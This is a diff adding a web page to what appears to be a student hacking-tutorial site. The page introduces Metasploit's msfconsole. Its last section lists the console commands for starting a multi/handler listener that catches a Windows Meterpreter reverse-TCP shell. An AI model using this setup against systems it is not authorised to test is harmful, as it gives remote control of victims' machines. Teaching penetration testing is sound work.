@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://fonts.googleapis.com/css?family=Roboto|Varela+Round" rel="stylesheet">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <link rel="stylesheet" href="style_payload.css">
+    <title>Payload Metasploit</title>
+</head>
+<body>
+    <header>
+        <nav>
+            <a href="../Main/LetsHack.html"><p>LetsHAck</p></a>
+            <ul>
+                <li><a href="../Main/LetsHack.html">Home</a></li>
+                <li>
+                    <a href="#">Methods</a>
+                    <ul>
+                        <li><a href="../Snooping/Snooping&Sniffing.html">Snooping & Sniffing</a></li>
+                        <li><a href="../Payload/payload.html">Payload Metasploit</a></li>
+                        <li><a href="#">Handshake decyption</a></li>
+                        <li><a href="#">Man in the middle</a></li>
+                    </ul>
+                </li>
+                <li><a href="#">About</a></li>
+                <li><a href="#">Contact</a></li>
+                <li id="li-Login">
+                    <div class="text-center">
+                        <!-- Button HTML (to Trigger Modal) -->
+                        <a href="#myModal" class="trigger-btn" data-toggle="modal">Login</a>
+                    </div>
+                </li>
+            </ul>
+        </nav>   
+        </header>
+  
+<!-- Modal HTML LOGIN -->
+<div id="myModal" class="modal fade">
+	<div class="modal-dialog modal-login">
+		<div class="modal-content">
+			<div class="modal-header">
+				<div class="avatar">
+					<img src="/examples/images/avatar.png" alt="Avatar">
+				</div>				
+				<h4 class="modal-title">Login</h4>	
+                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+			</div>
+			<div class="modal-body">
+				<form action="/examples/actions/confirmation.php" method="post">
+					<div class="form-group">
+						<input type="text" class="form-control" name="username" placeholder="Username" required="required">		
+					</div>
+					<div class="form-group">
+						<input type="password" class="form-control" name="password" placeholder="Password" required="required">	
+					</div>        
+					<div class="form-group">
+						<button type="submit" class="btn btn-primary btn-lg btn-block login-btn">Login</button>
+					</div>
+				</form>
+			</div>
+			<div class="modal-footer">
+				<a href="#">Forgot Password?</a>
+			</div>
+		</div>
+	</div>
+</div>     
+        
+        <section class="sec1">
+            <br>
+            <h1>MSFCONSOLE</h1>
+            <br>
+            <img src="../img/msfconsole.PNG" alt="Oops, something went wrong">
+        </section>
+
+        <section class="sec1">
+            <h1>WHAT IS THE MSFCONSOLE?</h1>
+            <br>
+            <p>The msfconsole is probably the most popular interface to the Metasploit Framework (MSF). It provides an “all-in-one” centralized console and allows you efficient access to virtually all of the options available in the MSF. MSFconsole may seem intimidating at first, but once you learn the syntax of the commands you will learn to appreciate the power of utilizing this interface.</p>
+            <br>
+            <p style="font-weight: bold;">Benefits of Using MSFconsole:</p>
+            <br>
+            <ul>
+                <li>=> It is the only supported way to access most of the features within Metasploit.</li>
+                <br>
+                <li>=> Provides a console-based interface to the framework.</li>
+                <br>
+                <li>=> Contains the most features and is the most stable MSF interface.</li>
+                <br>
+                <li>=> Full readline support, tabbing, and command completion.</li>
+                <br>
+                <li>=> Execution of external commands in msfconsole is possible:</li>
+            </ul>
+            <br>
+            <img src="../img/msfconsole2.PNG" alt="Oops, something went wrong" style="padding: 0px 0px 0px 100px;">
+        </section>
+
+        <section class="sec2">
+            <h1>LAUNCHING MSFCONSOLE</h1>
+            <br>
+            <p>Type the following commands to setup a payload:</p>
+            <ul>
+                <li>msfconsole</li>
+                <li>use multi/handler</li>
+                <li>set payload windows/meterpreter/reverse_tcp</li>
+                <li>set LHOST 'IP-adres</li>
+                <li>set LPORT 'port-number'</li>
+                <li>show options</li>
+                <li>exploit</li>
+            </ul>
+
+        </section>
+    
+</body>
+</html>
